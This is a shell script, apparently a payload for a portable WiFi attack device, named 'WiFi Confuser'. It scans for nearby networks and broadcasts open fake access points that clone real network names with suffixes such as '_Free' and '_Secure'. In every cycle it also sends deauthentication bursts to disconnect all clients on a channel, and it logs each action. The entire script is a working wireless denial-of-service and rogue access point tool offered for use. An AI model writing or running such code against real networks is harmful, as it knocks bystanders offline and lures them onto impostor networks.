#!/bin/sh
# Title: WiFi Confuser
# Author: NullSec
# Description: Create network confusion with deauths and fake networks
# Category: WiFi Chaos

LOOT_DIR="/mmc/nullsec/confuser"
mkdir -p "$LOOT_DIR"

echo "🌀 WIFI CONFUSER"
echo "━━━━━━━━━━━━━━━━"

[ ! -d "/sys/class/net/wlan0" ] && { echo "[!] wlan0 not found!"; exit 1; }

echo -n "Confusion duration in seconds [120]: "
read DURATION
DURATION=${DURATION:-120}

echo ""
echo "[*] Enabling monitor mode..."
airmon-ng start wlan0 >/dev/null 2>&1
MON_IF=$(iw dev | grep -oE "wlan[0-9]mon" | head -1)
[ -z "$MON_IF" ] && MON_IF="wlan0mon"

LOG_FILE="$LOOT_DIR/confuse_$(date +%Y%m%d_%H%M).log"

# Scan for existing networks to clone
echo "[*] Scanning for networks to confuse..."
timeout 10 airodump-ng "$MON_IF" -w /tmp/confuser --output-format csv 2>/dev/null &
sleep 10

# Extract real SSIDs
grep -E "^[0-9A-F]{2}:" /tmp/confuser-01.csv 2>/dev/null | \
    awk -F',' '{gsub(/^ +| +$/,"",$14); if($14!="") print $14}' | \
    sort -u | head -10 > /tmp/real_ssids.txt

SSID_COUNT=$(wc -l < /tmp/real_ssids.txt 2>/dev/null || echo 0)
echo "[+] Found $SSID_COUNT unique networks"

if [ "$SSID_COUNT" = "0" ]; then
    echo "Default_Network" > /tmp/real_ssids.txt
fi

echo ""
echo "[*] Creating confusion..."
echo "Confusion Log - $(date)" > "$LOG_FILE"

END_TIME=$(($(date +%s) + DURATION))
CYCLES=0

while [ $(date +%s) -lt $END_TIME ]; do
    # Read a real SSID and clone it with variations
    REAL_SSID=$(shuf -n1 /tmp/real_ssids.txt)
    [ -z "$REAL_SSID" ] && continue
    
    CH=$((RANDOM % 11 + 1))
    
    # Create confusing variations
    VARIATIONS="${REAL_SSID}_Guest
${REAL_SSID}_5G
${REAL_SSID}_Secure
${REAL_SSID}_Free
${REAL_SSID} 2
${REAL_SSID}_NEW"
    
    FAKE_SSID=$(echo "$VARIATIONS" | shuf -n1)
    
    echo "[🌀] Spoofing: $FAKE_SSID (CH:$CH)"
    echo "$(date +%H:%M:%S) SPOOF $FAKE_SSID" >> "$LOG_FILE"
    
    # Quick hostapd broadcast
    cat > /tmp/confuse_ap.conf << APEOF
interface=wlan0
ssid=$FAKE_SSID
channel=$CH
hw_mode=g
auth_algs=1
wpa=0
APEOF
    
    # Stop monitor mode briefly for AP
    airmon-ng stop "$MON_IF" >/dev/null 2>&1
    timeout 3 hostapd /tmp/confuse_ap.conf 2>/dev/null &
    sleep 3
    killall hostapd 2>/dev/null
    
    # Resume monitor and deauth
    airmon-ng start wlan0 >/dev/null 2>&1
    MON_IF=$(iw dev | grep -oE "wlan[0-9]mon" | head -1)
    
    echo "[🌀] Deauth burst on CH:$CH"
    echo "$(date +%H:%M:%S) DEAUTH CH:$CH" >> "$LOG_FILE"
    iwconfig "$MON_IF" channel $CH 2>/dev/null
    aireplay-ng -0 5 -a FF:FF:FF:FF:FF:FF "$MON_IF" 2>/dev/null &
    sleep 2
    killall aireplay-ng 2>/dev/null
    
    CYCLES=$((CYCLES + 1))
done

# Cleanup
killall hostapd aireplay-ng 2>/dev/null
airmon-ng stop "$MON_IF" 2>/dev/null
rm -f /tmp/confuser* /tmp/real_ssids.txt /tmp/confuse_ap.conf 2>/dev/null

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🌀 CONFUSION COMPLETE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Cycles: $CYCLES"
echo "Log: $LOG_FILE"
